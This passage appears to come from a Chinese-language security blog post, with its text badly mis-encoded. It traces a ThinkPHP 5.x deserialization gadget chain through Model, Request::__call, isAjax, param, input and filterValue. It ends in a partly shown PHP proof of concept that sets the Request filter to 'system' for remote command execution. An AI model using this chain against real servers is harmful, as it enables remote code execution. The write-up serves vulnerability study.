invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                            <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>([<span class="variable">$attr</span>]);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>() : [];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>, <span class="variable">$item</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$item</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æœ‰ç”¨çš„æ˜¯è¿™ä¸€æ®µ</p><p><img src="https://img-blog.csdnimg.cn/d73f0d00ef1b46a6bef0ecb18996e2d1.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_17,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>çœ‹åˆ°è¿™é‡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>);</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œå¦‚æœ**$relation<strong>å¯æ§ï¼Œä¸”</strong>visible($name)<strong>å¯æ§ï¼Œé‚£ä¹ˆå°±å¯ä»¥å½“ä½œè·³æ¿ï¼Œå»è°ƒç”¨</strong>visible<strong>æˆ–è€…</strong>__call**æ–¹æ³•</p><p>å¥½ï¼Œç°åœ¨æ¥çœ‹ï¼Œå…¶ä¸­**$this-&gt;append**å¯æ§</p><p>å…ˆçœ‹çœ‹èƒ½ä¸èƒ½ç»•è¿‡æ‰€æœ‰åˆ¤æ–­ï¼Œè¿›å…¥**$relation-&gt;visible($name)**è¿™ä¸€æ­¥</p><p>è°ƒç”¨äº†<strong>getRelation</strong>,è·Ÿè¿›</p><p><img src="https://img-blog.csdnimg.cn/27bf44bd44af40c88a2d3d46cd7fc66b.png?x-ss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_19,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…¶ä¸­**$this-&gt;relation**å¯æ§</p><p>å¾ˆå®¹æ˜“æ„é€ è¿”å›ä¸ºç©ºï¼Œä½¿å¾—<code>if (!$relation)</code>æˆç«‹</p><p>è·Ÿè¿›<strong>getAttr</strong></p><p><img src="https://img-blog.csdnimg.cn/5b6f760190df4d57ac2860a8bea0446a.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_16,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è·Ÿè¿›<strong>getData</strong></p><p><img src="https://img-blog.csdnimg.cn/a15501a6b2144a3895edb0734adfdf9a.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…¶ä¸­**$this-&gt;data<strong>å¯æ§ï¼Œ</strong>$name<strong>ä¸º<code>$this-&gt;append</code>çš„é”®å</strong>$key<strong>ï¼Œå¯æ§ï¼Œæ‰€ä»¥è¿”å›çš„å€¼å¯æ§ï¼Œæ‰€ä»¥</strong>$value<strong>å¯æ§ï¼Œæ‰€ä»¥ç›¸å½“äº<code>$relation =$this-&gt;data[$key]</code>,å› æ­¤</strong>$relation<strong>å®Œå…¨å¯æ§ï¼Œè€Œ<code>$relation-&gt;visible($name);</code>ä¸­çš„</strong>$name**æ˜¯<code>foreach ($this-&gt;append as $key =&gt; $name)</code>ä¸­çš„é”®å€¼ï¼Œä¹Ÿæ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥<code>$relation-&gt;visible($name);</code>æ•´ä¸ªéƒ½æ˜¯å¯æ§çš„</p><p>éœ€è¦æ³¨æ„çš„æ˜¯<strong>Conversion</strong>å’Œ<strong>Attribute</strong>è¿™ä¸¤ä¸ªç±»å®šä¹‰çš„æ—¶å€™éƒ½æ˜¯ç”¨çš„<strong>trait</strong></p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­ç±»åŒæ—¶ç»§æ‰¿äº†Attributeç±»å’ŒConversionç±»ã€‚æœ€ç»ˆæ¥åˆ°<code>\thinkphp\library\think\Model.php</code></p><p><img src="https://img-blog.csdnimg.cn/7719485afeca4b878608b6c429208459.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç„¶åæˆ‘ä»¬å…¨å±€å¯»æ‰¾<strong>visble</strong>æ–¹æ³•ï¼Œæœ€ç»ˆå‘ç°éƒ½ä¸å¯ç”¨</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªç±»ï¼Œè¿™ä¸ªç±»ä¸­è¦æ²¡æœ‰<strong>visible</strong>æ–¹æ³•ï¼Œä¸”è¦å­˜åœ¨**__call**æ–¹æ³•</p><p>æ¥åˆ°<code>/thinkphp/library/think/Request.php</code></p><p><img src="https://img-blog.csdnimg.cn/ee72f337de764e68ade6a5b596dab8f7.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œå‘ç°<strong>call_user_func_array</strong>å‡½æ•°å¯ä»¥åˆ©ç”¨ä»è€Œæ‰§è¡Œ<strong>system</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰æ™®é€šä½¿ç”¨ï¼š</span><br><span class="line"></span><br><span class="line">           <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$b</span>, <span class="variable">$c</span></span>) </span>&#123;  </span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$b</span>; </span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$c</span>; </span><br><span class="line"></span><br><span class="line">           &#125; </span><br><span class="line"></span><br><span class="line">          <span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&#x27;a&#x27;</span>, <span class="keyword">array</span>(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>)); </span><br><span class="line"></span><br><span class="line">          <span class="comment">//è¾“å‡º 1 2</span></span><br><span class="line"></span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰è°ƒç”¨ç±»å†…éƒ¨çš„æ–¹æ³•ï¼š</span><br><span class="line"></span><br><span class="line">         Class ClassA &#123; </span><br><span class="line"></span><br><span class="line">                 <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$b</span>, <span class="variable">$c</span></span>) </span>&#123; </span><br><span class="line"></span><br><span class="line">                  <span class="variable">$a</span> = <span class="variable">$b</span> + <span class="variable">$c</span>; </span><br><span class="line"></span><br><span class="line">                  <span class="keyword">echo</span> <span class="variable">$a</span>; </span><br><span class="line"></span><br><span class="line">                 &#125; </span><br><span class="line"></span><br><span class="line">            &#125; </span><br><span class="line"></span><br><span class="line">          <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="string">&#x27;ClassA&#x27;</span>,<span class="string">&#x27;a&#x27;</span>), <span class="keyword">array</span>(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>)); </span><br><span class="line"></span><br><span class="line">          <span class="comment">//è¾“å‡º  3 </span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œçš„**$method<strong>æ˜¯å‰é¢çš„</strong>visible<strong>ï¼Œä¸å¯æ§ï¼Œè€Œ</strong>$args<strong>æ˜¯ä¹‹å‰çš„</strong>$name<strong>å¯æ§ï¼Œä½†æ˜¯<code>array_unshift($args, $this)</code>æŠŠ<code>$this</code>æ’å…¥åˆ°äº†<code>$args</code>çš„æœ€å‰é¢ï¼Œå¯¼è‡´</strong>system**ä¸å¯ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_unshift() å‡½æ•°ç”¨äºå‘æ•°ç»„æ’å…¥æ–°å…ƒç´ ã€‚æ–°æ•°ç»„çš„å€¼å°†è¢«æ’å…¥åˆ°æ•°ç»„çš„å¼€å¤´ã€‚</span><br></pre></td></tr></table></figure><p><strong>æ–°æ€è·¯(å˜é‡è¦†ç›–)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨Thinkphpçš„Requestç±»ä¸­è¿˜æœ‰ä¸€ä¸ªfilteråŠŸèƒ½ï¼Œäº‹å®ä¸ŠThinkphpå¤šä¸ªRCEéƒ½ä¸è¿™ä¸ªåŠŸèƒ½æœ‰å…³ã€‚æˆ‘ä»¬å¯ä»¥å°è¯•è¦†ç›–filterçš„æ–¹æ³•å»æ‰§è¡Œä»£ç ã€‚</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°<strong>filterValue</strong>å‡½æ•°</p><p><img src="https://img-blog.csdnimg.cn/cf7ca15f141f4b2492dd31d326eb54cd.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>éœ€è¦åˆ©ç”¨è¿™é‡Œçš„**$value &#x3D; call_user_func($filter, $value)**ï¼Œä½†æ˜¯<code>$filter</code>å’Œ<code>$value</code>éƒ½ä¸å¯æ§ï¼Œéœ€è¦æ‰¾åˆ°å¯ä»¥åˆ©ç”¨<code>$value</code>çš„åœ°æ–¹ã€‚</p><p>æœ€ç»ˆæ‰¾åˆ°è¿™ä¸ªç±»çš„<strong>input</strong>æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="comment">// è·å–åŸå§‹æ•°æ®</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$name</span> = (<span class="keyword">string</span>) <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> != <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="comment">// è§£æname</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">list</span>(<span class="variable">$name</span>, <span class="variable">$type</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$data</span>, <span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è§£æè¿‡æ»¤å™¨</span></span><br><span class="line">        <span class="variable">$filter</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFilter</span>(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$data</span>, [<span class="variable">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">version_compare</span>(PHP_VERSION, <span class="string">&#x27;7.1.0&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">// æ¢å¤PHPç‰ˆæœ¬ä½äº 7.1 æ—¶ array_walk_recursive ä¸­æ¶ˆè€—çš„å†…éƒ¨æŒ‡é’ˆ</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">arrayReset</span>(<span class="variable">$data</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterValue</span>(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$type</span>) &amp;&amp; <span class="variable">$data</span> !== <span class="variable">$default</span>) &#123;</span><br><span class="line">            <span class="comment">// å¼ºåˆ¶ç±»å‹è½¬æ¢</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">typeCast</span>(<span class="variable">$data</span>, <span class="variable">$type</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<strong>input</strong>å‡½æ•°çš„å‚æ•°**$data**ä¸å¯æ§ï¼Œç»§ç»­æ‰¾ä¸€ä¸ªè°ƒç”¨<code>input</code>å‡½æ•°çš„åœ°æ–¹ã€‚æ‰¾åˆ°äº†<code>param</code>å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">            <span class="variable">$method</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">method</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡</span></span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$method</span>) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PATCH&#x27;</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(<span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å½“å‰è¯·æ±‚å‚æ•°å’ŒURLåœ°å€ä¸­çš„å‚æ•°åˆå¹¶</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;param = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">route</span>(<span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="comment">// è·å–åŒ…å«æ–‡ä»¶ä¸Šä¼ ä¿¡æ¯çš„æ•°ç»„</span></span><br><span class="line">            <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file</span>();</span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>) ? <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$file</span>) : <span class="variable language_">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$data</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å‚æ•°ä¾æ—§ä¸å¯æ§</p><p>ç»§ç»­æ‰¾è°ƒç”¨<code>param</code>å‡½æ•°çš„åœ°æ–¹ã€‚æ‰¾åˆ°äº†<code>isAjax</code>å‡½æ•°</p><p><img src="https://img-blog.csdnimg.cn/7dc1fde9c201411da755adabd1c94ce5.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…¶ä¸­<code>$this-&gt;config[&#39;var_ajax&#39;]</code>å¯æ§,æ„å‘³ç€<code>param</code>å‡½æ•°ä¸­çš„<code>$name</code>å¯æ§ã€‚<code>param</code>å‡½æ•°ä¸­çš„<code>$name</code>å¯æ§å°±æ„å‘³ç€<code>input</code>å‡½æ•°ä¸­çš„<code>$name</code>å¯æ§ã€‚</p><p>æ‰€ä»¥<code>$this-&gt;param</code>æ˜¯getå‚æ•°å¯æ§</p><p>ä¹‹åå†<strong>input</strong>å‡½æ•°ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è§£æè¿‡æ»¤å™¨</span></span><br><span class="line">       <span class="variable">$filter</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFilter</span>(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">           <span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$data</span>, [<span class="variable">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br></pre></td></tr></table></figure><p><strong>array_walk_recursive</strong>å‡½æ•°</p><p>å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ åº”ç”¨ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°</p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>array</em></td><td align="left">å¿…éœ€ã€‚è§„å®šæ•°ç»„ã€‚</td></tr><tr><td align="left"><em>myfunction</em></td><td align="left">å¿…éœ€ã€‚ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°çš„åç§°ã€‚</td></tr><tr><td align="left"><em>parameter,â€¦</em></td><td align="left">å¯é€‰ã€‚è§„å®šç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°çš„å‚æ•°ï¼Œæ‚¨å¯ä»¥ä¸ºå‡½æ•°è®¾ç½®ä¸€ä¸ªæˆ–å¤šä¸ªå‚æ•°ã€‚</td></tr></tbody></table><p>è¿™é‡Œåˆ©ç”¨<strong>array_walk_recursive</strong>å‡½æ•°æ¥è°ƒç”¨<strong>filterValue</strong>æ–¹æ³•ï¼Œå…¶ä¸­ä½œä¸ºå‚æ•°çš„**$filter<strong>æ˜¯é€šè¿‡</strong>getFilter**æ–¹æ³•å¾—åˆ°çš„</p><p><img src="https://img-blog.csdnimg.cn/2a9d5dd1b4764985ad299d44b62fba00.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…¶ä¸­**$filter&#x3D;$this-&gt;filter**å¯æ§</p><p>æ‰€ä»¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$data</span>, [<span class="variable">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br></pre></td></tr></table></figure><p><code>$data</code>ï¼Œ<code>filter</code>éƒ½å½»åº•å¯æ§äº†ï¼Œå³<code>$value = call_user_func($filter, $value)</code>ï¼Œå›è°ƒå‡½æ•°å’Œå‚æ•°éƒ½å¯æ§ï¼Œå³å¯æ„é€ POCäº†ã€‚</p><p><strong>POC</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span>=[];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>=[];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append=[<span class="string">&quot;lyy9&quot;</span>=&gt;[<span class="string">&#x27;xxx&#x27;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data=[<span class="string">&quot;lyy9&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook[<span class="string">&#x27;visible&#x27;</span>] = [<span class="variable language_">$this</span>, <span class="string">&#x27;isAjax&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span 